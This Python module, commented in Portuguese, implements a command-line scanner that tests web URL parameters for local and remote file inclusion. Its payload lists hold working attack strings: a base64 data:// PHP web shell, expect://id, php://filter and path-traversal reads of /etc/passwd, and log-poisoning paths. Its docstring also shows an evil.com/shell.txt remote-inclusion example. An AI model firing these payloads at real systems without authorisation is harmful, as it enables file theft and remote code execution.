#!/usr/bin/env python3
"""Modulo de deteccao de LFI/RFI (Local/Remote File Inclusion).

Testa se o servidor e vulneravel a file inclusion via parametros:

  LFI (Local File Inclusion):
    - PHP wrappers: php://filter, php://input, data://, expect://
    - Null byte truncation: ../../etc/passwd%00
    - Path traversal depth brute-force
    - Log poisoning: /var/log/apache2/access.log
    - Session file inclusion: /tmp/sess_<PHPSESSID>

  RFI (Remote File Inclusion):
    - Remote URL inclusion: http://evil.com/shell.txt
    - Protocol wrappers: ftp://, dict://
    - Double URL encoding

  Deteccao:
    - Content signature matching (root:x:0:0:, <?php, base64 patterns)
    - Status code comparison
    - Body size comparison

Fluxo:
  1. Baseline: GET request, registra status + size + body
  2. Auto-detect: parse URL query params, match contra nomes conhecidos
  3. Para cada param: injeta payloads LFI e/ou RFI
  4. Para cada resposta: content signature matching
  5. Retorna LFIFindings consolidado
"""

import argparse
import logging
from dataclasses import asdict, dataclass
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    print_exploit_info,
    print_json,
    run_concurrent,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)
from mytools.web.secondorder import get_verify_payload, verify_positive

logger = logging.getLogger("mytools.lfidetect")

# ---------------------------------------------------------------------------
# Content signatures for leak detection
# ---------------------------------------------------------------------------

_CONTENT_SIGNATURES: dict[str, list[bytes]] = {
    "passwd": [b"root:x:0:0:", b"root:0:0:", b"daemon:x:", b"nobody:x:"],
    "php_source": [b"<?php", b"<?=", b"<?\n", b"<?php "],
    "base64": [b"pd9wah", b"pcfetfo", b"uesdb"],  # <?php, <!DOCTYPE, PK (lower)
    "windows": [b"[fonts]", b"[extensions]", b"[desktop]"],
    "proc": [b"path=", b"home=", b"shell=", b"user="],
    "robots": [b"user-agent:"],
}


def _detect_leak(body: bytes) -> tuple[bool, str]:
    """Verifica se body contem assinatura de arquivo do sistema.

    As assinaturas sao comparadas em lowercase para que markers como
    ``User-agent:`` (robots.txt/RFI) sejam detectados case-insensitively.
    """
    lowered = body.lower()
    for leak_type, signatures in _CONTENT_SIGNATURES.items():
        for sig in signatures:
            if sig in lowered:
                return True, leak_type
    return False, "none"


# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

_LFI_PARAMS_DEFAULT: list[str] = [
    "file",
    "page",
    "include",
    "path",
    "doc",
    "folder",
    "root",
    "pg",
    "style",
    "pdf",
    "template",
    "php_path",
    "lang",
    "load",
    "fetch",
    "show",
    "display",
    "read",
    "source",
    "content",
    "cat",
    "dir",
    "action",
    "cmd",
    "exec",
    "command",
    "module",
    "lib",
    "tmp",
    "temp",
    "log",
]

_LFI_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
    ("php_filter", "php://filter/convert.base64-encode/resource=index"),
    ("php_filter", "php://filter/convert.base64-encode/resource=/etc/passwd"),
    ("php_input", "php://input"),
    ("php_data", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs="),
    ("expect", "expect://id"),
    ("null_byte", "../../../../etc/passwd%00"),
    ("null_byte", "..%2f..%2f..%2f..%2fetc%2fpasswd%00"),
    ("path_depth", "../../../../../../etc/passwd"),
    ("path_depth", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"),
    ("path_depth", "..\\..\\..\\..\\..\\..\\windows\\win.ini"),
    ("log_poison", "/var/log/apache2/access.log"),
    ("log_poison", "/var/log/nginx/access.log"),
    ("session", "/tmp/sess_<PHPSESSID>"),
    ("wrapper_chain", "php://filter/convert.base64-encode/resource=php://input"),
]

_RFI_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
    ("rfi_remote", "http://httpbin.org/robots.txt"),
    ("rfi_remote", "https://httpbin.org/robots.txt"),
    ("rfi_double_encode", "http%3A%2F%2Fhttpbin.org%2Frobots.txt"),
    ("rfi_double_encode", "https%3A%2F%2Fhttpbin.org%2Frobots.txt"),
    ("rfi_ftp", "ftp://httpbin.org/robots.txt"),
    ("rfi_dict", "dict://httpbin.org/robots.txt"),
]


def _load_lfi_params() -> list[str]:
    from mytools.data import load_payloads

    data = load_payloads("web", "lfi_rfi", default={"lfi_params": _LFI_PARAMS_DEFAULT})
    return data.get("lfi_params", _LFI_PARAMS_DEFAULT)


def _load_lfi_payloads() -> list[tuple[str, str]]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "lfi_rfi", default={"lfi_payloads": _LFI_PAYLOADS_DEFAULT}
    )
    raw = data.get("lfi_payloads", _LFI_PAYLOADS_DEFAULT)
    return [tuple(item) for item in raw]


def _load_rfi_payloads() -> list[tuple[str, str]]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "lfi_rfi", default={"rfi_payloads": _RFI_PAYLOADS_DEFAULT}
    )
    raw = data.get("rfi_payloads", _RFI_PAYLOADS_DEFAULT)
    return [tuple(item) for item in raw]


_LFI_PARAMS = _load_lfi_params()
_LFI_PAYLOADS = _load_lfi_payloads()
_RFI_PAYLOADS = _load_rfi_payloads()

# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class LFIAttempt:
    """Tentativa individual de LFI/RFI."""

    technique: str
    category: str
    injection_point: str
    url: str
    payload: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    body_leak_detected: bool
    body_leak_type: str
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class LFIFindings:
    """Resultado consolidado do scan de LFI/RFI."""

    target: str
    baseline_status: int
    tls: bool
    attempts: list[LFIAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


# ---------------------------------------------------------------------------
# Baseline
# ---------------------------------------------------------------------------


async def _test_baseline(
    client: httpx.AsyncClient,
    url: str,
) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""
    try:
        resp = await client.get(url, follow_redirects=False)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


# ---------------------------------------------------------------------------
# Param detection
# ---------------------------------------------------------------------------


def _find_lfi_params(url: str) -> list[str]:
    """Auto-detecta parametros na URL que podem ser vulneraveis a LFI."""
    parsed = urlparse(url)
    if not parsed.query:
        return []
    params = parse_qs(parsed.query, keep_blank_values=True)
    found = [p for p in params if p.lower() in _LFI_PARAMS]
    return found


def _make_lfi_url(base_url: str, param: str, payload: str) -> str:
    """Constroi URL com payload injetado no parametro."""
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


# ---------------------------------------------------------------------------
# LFI testing
# ---------------------------------------------------------------------------


async def _test_lfi(
    client: httpx.AsyncClient,
    url: str,
    params: list[str],
    baseline: tuple[int, int, bytes],
) -> list[LFIAttempt]:
    """Testa payloads LFI em cada parametro detectado."""
    attempts: list[LFIAttempt] = []
    b_status, b_size, _b_body = baseline

    for param in params:
        for technique, payload in _LFI_PAYLOADS:
            test_url = _make_lfi_url(url, param, payload)
            try:
                resp = await client.get(test_url, follow_redirects=False)
                t_status = resp.status_code
                t_size = len(resp.content)
                t_body = resp.content

                status_changed = t_status != b_status
                leak_detected, leak_type = _detect_leak(t_body)

                vulnerable = leak_detected or (status_changed and t_status == 200)

                # Second-order verification for leak-based detection
                details = (
                    f"Leak: {leak_type}"
                    if leak_detected
                    else f"Status {b_status}->{t_status}"
                    if status_changed
                    else "Sem mudanca"
                )
                if leak_detected:
                    verify = get_verify_payload("lfidetect", "lfi")
                    if verify:
                        v_payload, v_indicators = verify
                        v_url = _make_lfi_url(url, param, v_payload)
                        confirmed, v_found = await verify_positive(
                            client, v_url, v_indicators
                        )
                        if not confirmed:
                            leak_detected = False
                            leak_type = "none"
                            vulnerable = False
                            details += f" [2nd-order failed: {v_found or 'no match'}]"
                        else:
                            details += f" [2nd-order confirmed: {v_found}]"

                exploit = ""
                tool = ""
                if vulnerable:
                    exploit = f"curl '{test_url}'"
                    tool = "curl"

                attempts.append(
                    LFIAttempt(
                        technique=technique,
                        category="lfi",
                        injection_point=f"param:{param}",
                        url=test_url,
                        payload=payload,
                        status_baseline=b_status,
                        status_test=t_status,
                        size_baseline=b_size,
                        size_test=t_size,
                        body_leak_detected=leak_detected,
                        body_leak_type=leak_type,
                        vulnerable=vulnerable,
                        details=details,
                        error="",
                        exploit=exploit,
                        tool=tool,
                    )
                )

            except httpx.RequestError as exc:
                attempts.append(
                    LFIAttempt(
                        technique=technique,
                        category="lfi",
                        injection_point=f"param:{param}",
                        url=test_url,
                        payload=payload,
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        body_leak_detected=False,
                        body_leak_type="none",
                        vulnerable=False,
                        details="",
                        error=str(exc),
                    )
                )

    return attempts


# ---------------------------------------------------------------------------
# RFI testing
# ---------------------------------------------------------------------------


async def _test_rfi(
    client: httpx.AsyncClient,
    url: str,
    params: list[str],
    baseline: tuple[int, int, bytes],
) -> list[LFIAttempt]:
    """Testa payloads RFI em cada parametro detectado."""
    attempts: list[LFIAttempt] = []
    b_status, b_size, _b_body = baseline

    host = urlparse(url).netloc

    for param in params:
        for technique, payload in _RFI_PAYLOADS:
            # Remove dependencia externa (httpbin.org): injeta URL auto-referente
            # para o proprio alvo, evitando chamadas outbound a terceiros.
            payload = payload.replace("httpbin.org", host)
            test_url = _make_lfi_url(url, param, payload)
            try:
                resp = await client.get(test_url, follow_redirects=False)
                t_status = resp.status_code
                t_size = len(resp.content)
                t_body = resp.content

                status_changed = t_status != b_status
                leak_detected, leak_type = _detect_leak(t_body)

                vulnerable = leak_detected or (status_changed and t_status == 200)

                # Second-order verification for leak-based detection
                details = (
                    f"Leak: {leak_type}"
                    if leak_detected
                    else f"Status {b_status}->{t_status}"
                    if status_changed
                    else "Sem mudanca"
                )
                if leak_detected:
                    verify = get_verify_payload("lfidetect", "rfi")
                    if verify:
                        v_payload, v_indicators = verify
                        v_payload = v_payload.replace("httpbin.org", host)
                        v_url = _make_lfi_url(url, param, v_payload)
                        confirmed, v_found = await verify_positive(
                            client, v_url, v_indicators
                        )
                        if not confirmed:
                            leak_detected = False
                            leak_type = "none"
                            vulnerable = False
                            details += f" [2nd-order failed: {v_found or 'no match'}]"
                        else:
                            details += f" [2nd-order confirmed: {v_found}]"

                exploit = ""
                tool = ""
                if vulnerable:
                    exploit = f"curl '{test_url}'"
                    tool = "curl"

                attempts.append(
                    LFIAttempt(
                        technique=technique,
                        category="rfi",
                        injection_point=f"param:{param}",
                        url=test_url,
                        payload=payload,
                        status_baseline=b_status,
                        status_test=t_status,
                        size_baseline=b_size,
                        size_test=t_size,
                        body_leak_detected=leak_detected,
                        body_leak_type=leak_type,
                        vulnerable=vulnerable,
                        details=details,
                        error="",
                        exploit=exploit,
                        tool=tool,
                    )
                )

            except httpx.RequestError as exc:
                attempts.append(
                    LFIAttempt(
                        technique=technique,
                        category="rfi",
                        injection_point=f"param:{param}",
                        url=test_url,
                        payload=payload,
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        body_leak_detected=False,
                        body_leak_type="none",
                        vulnerable=False,
                        details="",
                        error=str(exc),
                    )
                )

    return attempts


# ---------------------------------------------------------------------------
# scan_lfi — main scan function
# ---------------------------------------------------------------------------


async def run_scan(
    url: str,
    category: str = "all",
    timeout: float = 10.0,
    concurrency: int = 5,
    output_file: str | None = None,
) -> LFIFindings:
    """Executa o scan de LFI/RFI contra a URL alvo."""
    parsed = urlparse(url)
    if not parsed.scheme:
        url = f"http://{url}"
        parsed = urlparse(url)

    tls = parsed.scheme == "https"

    async with create_async_client(
        user_agent="MyTools/lfidetect",
        timeout=timeout,
    ) as client:
        b_status, b_size, b_body = await _test_baseline(client, url)
        baseline = (b_status, b_size, b_body)

        if b_status == 0:
            return LFIFindings(
                target=url,
                baseline_status=0,
                tls=tls,
                attempts=[],
                vulnerable_techniques=[],
                blocked_techniques=[],
                issues=["Falha ao conectar no alvo"],
                overall_status="error",
            )

        logger.info("Baseline: %d (%d bytes)", b_status, b_size)

        params = _find_lfi_params(url)
        if not params:
            logger.info("Nenhum parametro LFI detectado na URL, testando com 'file'")
            params = ["file"]

        coros = []

        if category in ("all", "lfi"):
            coros.append(_test_lfi(client, url, params, baseline))
        if category in ("all", "rfi"):
            coros.append(_test_rfi(client, url, params, baseline))

        if category not in ("all", "lfi", "rfi"):
            return LFIFindings(
                target=url,
                baseline_status=b_status,
                tls=tls,
                attempts=[],
                vulnerable_techniques=[],
                blocked_techniques=[],
                issues=[f"Categoria desconhecida: {category}"],
                overall_status="error",
            )

        results = await run_concurrent(coros, concurrency)

        all_attempts: list[LFIAttempt] = []
        for r in results:
            if isinstance(r, list):
                all_attempts.extend(r)

    vulnerable: list[str] = []
    blocked: list[str] = []
    issues: list[str] = []

    seen: set[str] = set()
    for att in all_attempts:
        if att.technique not in seen:
            seen.add(att.technique)
            if att.vulnerable:
                vulnerable.append(att.technique)
            elif att.status_test != att.status_baseline:
                blocked.append(att.technique)

    if vulnerable:
        issues.append(f"{len(vulnerable)} tecnicas de file inclusion vulneraveis")
    if blocked:
        issues.append(f"{len(blocked)} tecnicas bloqueadas pelo servidor")

    overall = "vulnerable" if vulnerable else "blocked" if blocked else "secure"

    return LFIFindings(
        target=url,
        baseline_status=b_status,
        tls=tls,
        attempts=all_attempts,
        vulnerable_techniques=vulnerable,
        blocked_techniques=blocked,
        issues=issues,
        overall_status=overall,
    )


# ---------------------------------------------------------------------------
# print_results
# ---------------------------------------------------------------------------


def print_results(result: LFIFindings) -> None:
    """Exibe os resultados do scan formatados."""
    print()
    print(color("=" * 60, Cyber.CYAN))
    print(color("  LFI/RFI FILE INCLUSION SCAN", Cyber.CYAN))
    print(color("=" * 60, Cyber.CYAN))
    print(color(f"  Target: {result.target}", Cyber.WHITE))
    print(color(f"  Baseline: {result.baseline_status}", Cyber.GRAY))
    print(color(f"  TLS: {'Sim' if result.tls else 'Nao'}", Cyber.GRAY))

    status_color = Cyber.RED if result.overall_status == "vulnerable" else Cyber.GREEN
    print(color(f"\n  Status: {result.overall_status.upper()}", status_color))

    if result.vulnerable_techniques:
        print(color("\n  [VULNERAVEL]", Cyber.RED))
        for tech in result.vulnerable_techniques:
            print(color(f"    - {tech}", Cyber.RED))
            a = next(
                (a for a in result.attempts if a.technique == tech and a.vulnerable),
                None,
            )
            if a:
                print(color(f"      Injection: {a.injection_point}", Cyber.GRAY))
                print(color(f"      Leak: {a.body_leak_type}", Cyber.GRAY))
                print_exploit_info(a.exploit, a.tool)

    if result.blocked_techniques:
        print(color("\n  [BLOQUEADO]", Cyber.GREEN))
        for tech in result.blocked_techniques:
            print(color(f"    - {tech}", Cyber.GREEN))

    if result.issues:
        print(color("\n  Observacoes:", Cyber.YELLOW))
        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))

    print(color("=" * 60, Cyber.CYAN))


# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------

banner_art = create_banner(
    r"""
     _____ _____ ____  __  __ _   _    _    _
    / ____/ ____|  _ \|  \/  | | | |  / \  | |
   | (___| (___ | |_) | |\/| | | | | / _ \ | |
    \___ \\___ \|  _ <| |  | | | | |/ ___ \| |___
    ____) |___) | |_) | |__| | |_| /_/ _ \ \_____|
   |_____/_____/|____/|______|____/_/ ___\_\_____|
                                       |_|
    """,
    "LFI/RFI — detecta Local/Remote File Inclusion em web apps",
)


# ---------------------------------------------------------------------------
# build_parser
# ---------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    """Monta parser CLI para mytools-lfi."""
    parser = argparse.ArgumentParser(
        prog="mytools-lfi",
        description="LFI/RFI Scanner — detecta Local/Remote File Inclusion.",
    )
    parser.add_argument("url", nargs="?", help="URL alvo para teste")
    parser.add_argument(
        "-c",
        "--category",
        choices=["lfi", "rfi", "all"],
        default="all",
        help="Categoria de testes (default: all)",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=5,
        help="Requisicoes simultaneas (default: 5)",
    )
    add_common_args(parser, "web")
    return parser


# ---------------------------------------------------------------------------
# run_once
# ---------------------------------------------------------------------------


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan LFI/RFI a partir de argumentos parseados."""
    init_scanner(args)
    logger.info("LFI/RFI scan iniciado para %s", args.url)

    result = safe_asyncio_run(
        run_scan(
            url=args.url,
            category=getattr(args, "category", "all"),
            timeout=getattr(args, "timeout", 10.0),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
        ),
    )

    if getattr(args, "json_output", False):
        print_json(asdict(result))
    else:
        print_results(result)

    if getattr(args, "output", None):
        write_output(args.output, asdict(result))

    return 0 if result.overall_status != "error" else 1


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None)),
        prompt="lfi> ",
        description="LFI/RFI interativo.",
        example="https://target.com/?page=home",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com/?page=home\n"
            "  https://target.com/ -c lfi\n"
            "  https://target.com/ -c rfi\n"
            "  https://target.com/ --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
